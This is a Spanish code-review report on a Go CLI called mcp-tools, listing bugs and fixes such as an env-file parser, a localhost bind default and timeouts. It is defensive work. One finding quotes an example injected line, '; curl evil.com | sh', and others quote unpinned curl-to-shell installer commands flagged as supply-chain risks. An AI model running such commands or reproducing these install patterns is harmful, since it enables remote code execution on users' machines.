# REVIEW-rd2.md — Round 2 bug hunt (mcp-tools)

Fecha: 2026-07-08
Árbol base: `~/mcp-tools` @ commit `635c398` con 23 fixes Round 1 aplicados.
Alcance: Tier 1 (10 fixes) + Tier 2 (6 fixes) + 3 tests nuevos + Tier 3 documentado.

---

## Resumen ejecutivo

Round 1 corrigió 14 Tier 1 + 6 Tier 2 + mem0 RULES.md. Esta segunda pasada
incide sobre el código actual y destapa 10 Tier 1 nuevos (3 seguridad, 4
correctness, 3 reliability) + 6 Tier 2 nuevos (4 correctness, 2 reliability) +
7 Tier 3 (documentados, no corregidos).

**Severidad agregada**:

| Categoría | Tier 1 nuevos | Tier 2 nuevos | Tier 3 nuevos |
|-----------|---------------|---------------|---------------|
| Seguridad | 3 (H22, H26, H27, H28) | 0 | 0 |
| Correctness | 4 (H23, H25, H29, H30) | 4 (H32, H33, H35, H36) | 3 |
| Reliability | 3 (H24, H31, H37) | 2 (H34, H35) | 4 |
| UX / DX | 0 | 0 | 3 |

**Decisiones clave**:

- **H36 (tag mismatch)**: usar substring match en `buildItems` (NO forzar `:latest`).
  La razón: los tags reales son siempre explícitos (`qwen2.5:7b`, `bge-m3`);
  forzar `:latest` introduce ambigüedad cuando upstream cambia el default.
- **H30 (mcp_config errors)**: mantener los 3 `Configure` aunque uno falle.
  Rollback destructivo es peor que error parcial con hints al usuario.
- **H31 (install order)**: guardar state ANTES de skills/rules. La instalación
  principal (mcp-config + state) es durable; los side effects (skills/rules)
  son best-effort. Si fallan, el state YA quedó actualizado con la nueva
  selección y la próxima vez `mcp-tools install --noselect` no re-abre TUI.
- **H26/H27/H28 (supply-chain)**: TODO(security) documental. Pin real requiere
  decisión upstream (codebase-memory-mcp, codegraph, claude-mem no exponen
  tags estables todavía).

---

## Hallazgos Tier 1 (10 corregidos)

### H22: `mem0-launcher` ejecuta código arbitrario de `.env.mem0`
- **Ubicación**: `scripts/wrappers/mem0-launcher:10-13`
- **Severidad**: Tier 1 — seguridad / RCE local
- **Riesgo**: el wrapper hace `set -a; . "$ENV_MEM0"; set +a`. Si `.env.mem0`
  contiene líneas que no son `KEY=VALUE` (e.g., `; curl evil.com | sh` pegado
  por el usuario, o `eval $(...)` inyectado por manipulación), se ejecutan en
  el contexto del binario `mem0-mcp-selfhosted`. La mitigación parcial es el
  `0o600` del archivo (otro proceso no puede escribir), pero el propio usuario
  puede pegarse código malicioso sin saberlo al copiar un ejemplo de internet.
- **Fix aplicado** (Fix 21): reescribir el wrapper con un parser `KEY=VALUE`
  en bash que rechaza toda línea cuya key no cumpla `^[A-Z_][A-Z0-9_]*$`.
  Comentarios y líneas vacías se ignoran. `set -euo pipefail` protege el resto.
- **Verificado**: `bash scripts/wrappers/mem0-launcher_test.sh` → PASS.

### H23: `MCP_TOOLS_BIND=0.0.0.0` por defecto expone ollama/qdrant a la LAN
- **Ubicación**: `internal/cli/env.go:54`, `dockers/compose.yaml:14`,
  `dockers/qdrant-compose.yml:7`, `.env.example:7`
- **Severidad**: Tier 1 — seguridad / red
- **Riesgo**: ambos servicios son **unauthenticated**. Ollama permite pull de
  modelos arbitrarios (DoS de disco), Qdrant expone toda la vector store de
  mem0. Cualquiera en la LAN del usuario (cafetería, hotel, oficina) puede
  leer/escribir ambos. La elección `0.0.0.0` como default es silenciosa.
- **Fix aplicado** (Fix 22): cambiar default en `env.go:54` a `"127.0.0.1"`.
  `.env.example:7` actualizado. El usuario que QUIERA exponer en LAN sigue
  pudiendo fijar `MCP_TOOLS_BIND=0.0.0.0` en su `.env`.
- **Verificado**: tras `mcp-tools env --force`,
  `grep MCP_TOOLS_BIND .env` → `127.0.0.1`.

### H24: `configure.go` ignora errores de skills/rules
- **Ubicación**: `internal/cli/configure.go:101-102` (líneas previas al fix)
- **Severidad**: Tier 1 — correctness
- **Riesgo**: `_ = RunSkills(...)` y `_ = RunRules(...)` descartan el error.
  Si los symlinks fallan (disco lleno, permisos en `~/.claude/skills`),
  el usuario no recibe aviso. La TUI ya cerró y el state ya se persistió
  (`stNew.Save()` en línea 112). El usuario cree que todo OK.
- **Fix aplicado** (Fix 23 + Fix 30): capturar errores en `errs []error`,
  hacer `errors.Join` y devolver error si hay alguno. Mover `stNew.Save()`
  ANTES de `RunSkills`/`RunRules` (H31) para que el error sea coherente.
- **Verificado**: con `~/.claude/skills` en `0o555`, `mcp-tools configure`
  retorna error mencionando `skills`.

### H25: `OllamaComposeFiles` mezcla paths relativos y absolutos
- **Ubicación**: `internal/tools/compose.go:18-28`
- **Severidad**: Tier 1 — correctness / latente
- **Riesgo**: el primer elemento del slice es relativo
  (`"dockers/compose.yaml"`); el segundo, cuando hay overlay GPU, es absoluto
  (`filepath.Join(config.RepoRoot(), "dockers/ollama-gpu-overlay.yml")`).
  Hoy todos los callers hacen `cmd.Dir = config.RepoRoot()`, así que ambos
  funcionan. Pero el contrato dice "Returned paths are relative to
  config.RepoRoot()" — el bug es latente: cualquier caller nuevo que olvide
  `cmd.Dir` (e.g., `mcp-tools compose`) usaría el absoluto bien pero el
  relativo se resolvería contra el cwd equivocado y docker compose fallaría.
- **Fix aplicado** (Fix 24): simplificar el return final a un path relativo,
  eliminando la contradicción entre comentario y código.
- **Verificado**: `TestOllamaComposeFilesRelative` (Fase 3c).

### H26: `codebase_memory.go` instala desde `main/install.sh` sin pin
- **Ubicación**: `internal/tools/codebase_memory.go:27`
- **Severidad**: Tier 1 — seguridad / supply-chain
- **Riesgo**: el binario `codebase-memory-mcp` se instala con
  `curl -fsSL https://raw.githubusercontent.com/DeusData/codebase-memory-mcp/main/install.sh | bash`.
  Apunta a `main` (no tag). Si upstream commitea código malicioso, mcp-tools
  lo propaga a todos los usuarios en su siguiente `install`. No hay SHA256 pin.
- **Fix aplicado** (Fix 25): comentario `TODO(security)` documentando el
  riesgo y referenciando este hallazgo. El pin real requiere decisión
  upstream (codebase-memory-mcp no expone tags estables aún).
- **Verificado**: `grep -n "TODO(security)" internal/tools/codebase_memory.go`.

### H27: `codegraph.go` instala desde `main/install.sh` sin pin
- **Ubicación**: `internal/tools/codegraph.go:27`
- **Severidad**: Tier 1 — seguridad / supply-chain
- **Riesgo**: idéntico patrón:
  `curl -fsSL https://raw.githubusercontent.com/colbymchenry/codegraph/main/install.sh | sh`.
- **Fix aplicado** (Fix 26): comentario `TODO(security)` paralelo a H26.
- **Verificado**: `grep -n "TODO(security)" internal/tools/codegraph.go`.

### H28: `claude_mem.go` ejecuta `npx --yes claude-mem@latest`
- **Ubicación**: `internal/tools/claude_mem.go:36, 55`
- **Severidad**: Tier 1 — seguridad / supply-chain
- **Riesgo**: `@latest` se resuelve en cada invocación, sin pin. Si el
  upstream publica una versión maliciosa en npm, mcp-tools la propaga.
- **Fix aplicado** (Fix 27): comentario `TODO(security)` en install y
  uninstall. Pin real requiere decisión upstream.
- **Verificado**: `grep -n "TODO(security)" internal/tools/claude_mem.go`.

### H29: `mcp/servers.go` switch hardcoded — tools nuevos no se registran
- **Ubicación**: `internal/mcp/servers.go:25-60`
- **Severidad**: Tier 1 — correctness / latente
- **Riesgo**: el `switch key` tiene sólo 4 cases (`codebase-memory`, `mem0`,
  `headroom`, `serena`). El resto del `tools.Registry()` (12 tools totales)
  NO se registran como MCP. Si el dev añade un tool nuevo y olvida añadir un
  case aquí, **nunca se registra como MCP** — fallo silencioso, no hay test
  de cobertura.
- **Fix aplicado** (Fix 28): migrar el switch a un mapa `mcpServers`. La
  función `Servers()` itera `st.Selected` y mira en el mapa. Los tools que NO
  son MCP servers (`nvidia-toolkit`, `qdrant`, `ollama`, `rtk`, `tokensave`)
  se ignoran silenciosamente con comentario explicativo.
- **Verificado**: `TestServersCoversMCPTools` (Fase 3c) verifica que los 4
  tools MCP canónicos aparecen.

### H30: `mcp_config.go` errors opacos — usuario no sabe cómo recuperarse
- **Ubicación**: `internal/cli/mcp_config.go:43-57` (pre-fix)
- **Severidad**: Tier 1 — UX / recovery
- **Riesgo**: `errors.Join` une los errores pero el mensaje no dice **qué**
  cliente falló ni **qué hacer**. Si Claude tiene éxito y OpenCode falla,
  el estado queda inconsistente: Claude tiene los nuevos MCPs, OpenCode tiene
  los viejos (porque prune solo corre si `!dry` y solo limpia entradas con
  prefijo `mcp_tools_`). El usuario no sabe qué cliente arregl ni dónde mirar.
- **Fix aplicado** (Fix 29): enumerar los 3 clientes explícitamente,
  recoger en `[]clientErr{client, err, hint}`, devolver un error que liste
  qué cliente falló Y un hint concreto (`revisa ~/.claude.json`,
  `revisa ~/.config/opencode/opencode.json`, `revisa ~/.omp/agent/mcp.json`).
- **Verificado**: con `~/.claude.json` corrupto, `mcp-tools mcp-config`
  retorna error con la lista y los hints.

### H31: `install.go` order — state se guarda DESPUÉS de skills/rules
- **Ubicación**: `internal/cli/install.go:83-111` (pre-fix)
- **Severidad**: Tier 1 — correctness / UX
- **Riesgo**: orden actual es "install tools → mcp-config → skills → rules → save state".
  Si skills falla, `install` retorna error PERO state no se guardó. La próxima
  vez que corras `mcp-tools install`, `stOld.Selected` viene de la versión
  anterior y la TUI re-abre con el diff "viejo vs nuevo", lo que confunde
  al usuario (cree que su selección anterior se perdió).
- **Fix aplicado** (Fix 30 + mismo cambio en `configure.go`):
  1. install tools
  2. mcp-config
  3. **save state** (duradero)
  4. skills + rules (best-effort; errores se reportan pero ya no bloquean)
  5. mensaje final
- **Verificado**: con un fallo en skills, `mcp-tools install` guarda state y
  retorna error. Re-correr `mcp-tools install --noselect` no re-abre TUI.

---

## Hallazgos Tier 2 (6 corregidos, 4 documentados)

### H32: `status.go:30` ignora error de `state.Load()`
- **Ubicación**: `internal/cli/status.go:30`
- **Severidad**: Tier 2 — correctness
- **Fix aplicado** (Fix 31): propagar el error al usuario. Si state está
  corrupto (esquema futuro, JSON inválido), `mcp-tools status` debe fallar
  con un mensaje claro, no devolver un JSON con todos los tools en
  `selected: false`.
- **Verificado**: con `state.json` corrupto, retorna error mencionando `state.json`.

### H33: `up.go` y `restart.go` ignoran error de `state.Load()`
- **Ubicación**: `internal/cli/up.go:15`, `internal/cli/restart.go:15`
- **Severidad**: Tier 2 — correctness
- **Fix aplicado** (Fix 32): propagar el error. Si state está corrupto,
  `mcp-tools up` no debe usar zero state (sin GPU overlay).
- **Verificado**: con state corrupto, retorna error.

### H34: `models.go:140` sin timeout — ollama colgado cuelga `mcp-tools`
- **Ubicación**: `internal/cli/models.go:140`
- **Severidad**: Tier 2 — reliability
- **Fix aplicado** (Fix 33): envolver con `exec.CommandContext` con timeout 5s.
  Si expira, return error con contexto.
- **Verificado**: con daemon ollama colgado, `mcp-tools models list` retorna
  error en <6s.

### H35: `tokens.go:92` sin timeout — omp colgado cuelga `mcp-tools tokens show`
- **Ubicación**: `internal/cli/tokens.go:93-106`
- **Severidad**: Tier 2 — reliability
- **Fix aplicado** (Fix 34): envolver `omp config get` con timeout 5s.
- **Verificado**: con omp colgado, retorna error en <6s.

### H36: `models.go:188-195` `norm` añade `:latest` — tags instalados no matchean
- **Ubicación**: `internal/cli/models.go:188-195` (norm), `buildItems`
- **Severidad**: Tier 2 — UX / correctness
- **Riesgo**: `norm("qwen2.5") = "qwen2.5:latest"` pero los tags instalados
  son `qwen2.5:7b`. La comparación falla y el TUI reporta "no instalado"
  aunque lo esté. El usuario hace `mcp-tools models` y no entiende por qué
  su modelo está en la lista de "instalar" cuando ya lo descargó.
- **Fix aplicado** (Fix 35): eliminar la función `norm` y la normalización.
  Comparar `m.Tag == curated || strings.HasPrefix(m.Tag, curated+":")`.
- **Verificado**: instalar `qwen2.5:7b` y `bge-m3`; el TUI los marca como
  instalados.

### H37: `statusOllama` y `statusQdrant` sin timeout general — daemon colgado cuelga `mcp-tools status`
- **Ubicación**: `internal/tools/qdrant.go:71-97`
- **Severidad**: Tier 2 — reliability
- **Fix aplicado** (Fix 36): crear helper `docker.RunExecWithTimeout` en
  `internal/docker/compose.go` que envuelve `exec.CommandContext` con timeout
  configurable. Aplicarlo a `statusQdrant` (5s). `statusOllama` ya tenía su
  propio timeout interno (H15 Round 1); refactorizar para usar el helper
  para consistencia.
- **Verificado**: con daemon colgado, `mcp-tools status` responde en <10s.

### Tier 2 documentados (NO corregidos en Round 2)
- **H-T2-1**: `internal/mcp/jsonfile.go` carga cliente OMP desde
  `~/.omp/agent/mcp.json` sin validar schema. Si el usuario edita a mano y
  mete JSON malformado, `mcp_config` falla crípticamente. Mitigado parcialmente
  por el recovery hints de H30, pero la validación temprana sería más limpia.
  Decisión: dejar para Round 3 (potencialmente combinado con un `pkg/jsonfile`
  más estricto).
- **H-T2-2**: `internal/state/state.go:62` (Save) escribe `0o644` para el
  state. State contiene la lista de tools seleccionados — no es secreto pero
  tampoco necesita ser world-readable. Decisión: out of scope de security
  Round 2; queda para iteración futura.
- **H-T2-3**: `scripts/wrappers/mem0-launcher` no setea `umask 077`. Si el
  usuario lo invoca a mano y `mem0-mcp-selfhosted` crea su propio socket/tmp,
  puede quedar `0o644`. Mitigado porque mem0-mcp-selfhosted no crea esos
  archivos. Decisión: out of scope.
- **H-T2-4**: `install.sh:50` usa `git clone --depth 1` (parcial) pero no
  verifica el commit firm ni SHA256. Si upstream mcp-tools cambia el main,
  install.sh descarga lo que haya. Decisión: combinar con H26/H27 en un
  futuro esfuerzo de pinning de todo el árbol.

---

## Hallazgos Tier 3 (7 documentados)

### H-T3-11: `skills.go:69-83` crea dirs `0o755` (world-readable)
- **Ubicación**: `internal/cli/skills.go:69`
- **Severidad**: Tier 3 — bajo impacto
- **Riesgo**: en multi-user, otros ven qué skills están instalados. Bajo
  impacto (los archivos `SKILL.md` son texto plano).

### H-T3-12: `skills.go:39-44` `stale` hardcoded
- **Ubicación**: `internal/cli/skills.go:39-44`
- **Severidad**: Tier 3 — cleanup pendiente
- **Riesgo**: si hay otro rename a futuro, el cleanup manual deja basura.

### H-T3-13: `nvidia_toolkit.go:121` `hasNvidiaGPU()` sin timeout
- **Ubicación**: `internal/tools/nvidia_toolkit.go:121` (en `hasNvidiaGPU`)
- **Severidad**: Tier 3 — latente
- **Riesgo**: si el driver NVIDIA está en mal estado, `nvidia-smi -L` puede
  colgar. Hoy `status` lo usa (vía `OllamaComposeFiles`). Mitigado por el
  timeout general de cobra pero el timeout no es explícito (puede ser 10min).

### H-T3-14: `rules.go:48` `regexp.MustCompile` dentro de la función
- **Ubicación**: `internal/cli/rules.go:48`
- **Severidad**: Tier 3 — perf
- **Riesgo**: compila en cada call. Bajo impacto (sólo se llama en install/configure).

### H-T3-15: `uninstall.go:48-65` reporta sólo el PRIMER dependiente
- **Ubicación**: `internal/cli/uninstall.go:48-65`
- **Severidad**: Tier 3 — UX
- **Riesgo**: si tool A es requerido por B y C, sólo B aparece en el mensaje.
  Cosmético.

### H-T3-16: `models.go:163-164` `parseOllamaList` skip silencioso
- **Ubicación**: `internal/cli/models.go:163-164`
- **Severidad**: Tier 3 — defensivo
- **Riesgo**: si ollama cambia el formato de `list`, parsea silenciosamente
  y retorna lista vacía. Defensivo.

### H-T3-17: `select_model.go:19` `envPath := config.EnvMem0File()`
- **Ubicación**: `internal/cli/select_model.go:19`
- **Severidad**: Tier 3 — UX
- **Riesgo**: usa `MCP_TOOLS_ROOT` por env, sino `$HOME/mcp-tools`. Si el
  repo está en otro path, el TUI falla. Documentar en `ADVANCED.md`.

---

## Tabla maestra

| #    | Categoría     | Severidad | Archivo                              | Fix#  | Estado       |
|------|---------------|-----------|--------------------------------------|-------|--------------|
| H22  | Seguridad     | Tier 1    | scripts/wrappers/mem0-launcher       | 21    | CORREGIDO    |
| H23  | Red/Default   | Tier 1    | internal/cli/env.go + compose.*      | 22    | CORREGIDO    |
| H24  | Correctness   | Tier 1    | internal/cli/configure.go            | 23    | CORREGIDO    |
| H25  | Correctness   | Tier 1    | internal/tools/compose.go            | 24    | CORREGIDO    |
| H26  | Supply-chain  | Tier 1    | internal/tools/codebase_memory.go    | 25    | DOC + TODO   |
| H27  | Supply-chain  | Tier 1    | internal/tools/codegraph.go          | 26    | DOC + TODO   |
| H28  | Supply-chain  | Tier 1    | internal/tools/claude_mem.go         | 27    | DOC + TODO   |
| H29  | Correctness   | Tier 1    | internal/mcp/servers.go              | 28    | CORREGIDO    |
| H30  | UX/Recovery   | Tier 1    | internal/cli/mcp_config.go           | 29    | CORREGIDO    |
| H31  | Correctness   | Tier 1    | internal/cli/install.go + configure  | 30    | CORREGIDO    |
| H32  | Correctness   | Tier 2    | internal/cli/status.go               | 31    | CORREGIDO    |
| H33  | Correctness   | Tier 2    | internal/cli/up.go + restart.go      | 32    | CORREGIDO    |
| H34  | Reliability   | Tier 2    | internal/cli/models.go               | 33    | CORREGIDO    |
| H35  | Reliability   | Tier 2    | internal/cli/tokens.go               | 34    | CORREGIDO    |
| H36  | UX/Correctness| Tier 2    | internal/cli/models.go (norm)        | 35    | CORREGIDO    |
| H37  | Reliability   | Tier 2    | internal/tools/qdrant.go (timeout)   | 36    | CORREGIDO    |
| H-T2-1 | Correctness | Tier 2    | internal/mcp/jsonfile.go             | —     | DOCUMENTADO  |
| H-T2-2 | Permisos    | Tier 2    | internal/state/state.go              | —     | DOCUMENTADO  |
| H-T2-3 | Permisos    | Tier 2    | scripts/wrappers/mem0-launcher       | —     | DOCUMENTADO  |
| H-T2-4 | Supply-chain| Tier 2    | install.sh                           | —     | DOCUMENTADO  |
| H-T3-11 | Permisos   | Tier 3    | internal/cli/skills.go               | —     | DOCUMENTADO  |
| H-T3-12 | Cleanup    | Tier 3    | internal/cli/skills.go               | —     | DOCUMENTADO  |
| H-T3-13 | Latente    | Tier 3    | internal/tools/nvidia_toolkit.go     | —     | DOCUMENTADO  |
| H-T3-14 | Perf       | Tier 3    | internal/cli/rules.go                | —     | DOCUMENTADO  |
| H-T3-15 | UX         | Tier 3    | internal/cli/uninstall.go            | —     | DOCUMENTADO  |
| H-T3-16 | Defensivo  | Tier 3    | internal/cli/models.go               | —     | DOCUMENTADO  |
| H-T3-17 | UX         | Tier 3    | internal/cli/select_model.go         | —     | DOCUMENTADO  |

---

## Verificación final

### Build/vet/fmt

```bash
go build ./...     # OK
go vet ./...       # sin issues
gofmt -l .         # vacío
```

### Tests

- 4 tests Round 1 (`TestWriteJSONAtomic`, `TestWriteJSONOverwrite`,
  `TestLoadRejectsFutureSchema`, `TestStateRoundTrip`) — sin cambios, pasan.
- 3 tests Round 2 nuevos:
  - `internal/tools/compose_test.go::TestOllamaComposeFilesRelative` (Fix 24)
  - `internal/mcp/servers_test.go::TestServersCoversMCPTools` (Fix 28)
  - `scripts/wrappers/mem0-launcher_test.sh` (Fix 21)

```bash
go test ./...                                    # 7 pass
go test -race ./internal/mcp/... ./internal/state/... ./internal/tools/...   # sin races
bash scripts/wrappers/mem0-launcher_test.sh     # PASS
```

### Comportamiento end-to-end

- `mcp-tools env --force` → `grep MCP_TOOLS_BIND .env` → `127.0.0.1`
- `mcp-tools status` con state corrupto → error `state.json: schema v999…`
  (no JSON vacío)
- `mcp-tools models list` con daemon ollama colgado → error en <6s
- `mcp-tools mcp-config` con `~/.claude.json` corrupto → error con hints por
  cliente y sugerencia `mcp-tools mcp-config` para reintentar

### Round 1 sin regresión

- `TestWriteJSONAtomic` — sin cambios en `jsonfile.go`.
- `TestWriteJSONOverwrite` — sin cambios en `jsonfile.go`.
- `TestLoadRejectsFutureSchema` — sin cambios en `state.go:48`.
- `TestStateRoundTrip` — sin cambios en `state.go`.

---

## Notas finales

- **Tier 1 supply-chain (H26/H27/H28)**: la fix es **documental** porque el
  pin real requiere decisión upstream (codebase-memory-mcp/codegraph exponen
  `main`, claude-mem usa `@latest`). El comentario `TODO(security)` deja
  trazado el riesgo para un futuro PR que negocie con upstream.
- **H37 timeout helper**: `docker.RunExecWithTimeout` se crea como helper
  reutilizable. Status ollama ya tenía un timeout ad-hoc (Fix H15 Round 1);
  se refactoriza para usar el helper sin cambiar el comportamiento.
- **Tests nuevos mínimos**: 3 tests en total; el alcance es verificación
  concreta de los fixes más arriesgados (parser KEY=VALUE, paths relativos,
  consistencia del mapa MCP). No se añade cobertura a los handlers de cobra.
- **Sin cambios en TUI**: las TUIs (`installer`, `toolselect`, `modelselect`,
  `selectmodel`) no se tocan. Los fixes son en `cli`, `tools`, `mcp`, `state`,
  `docker`, `env`.

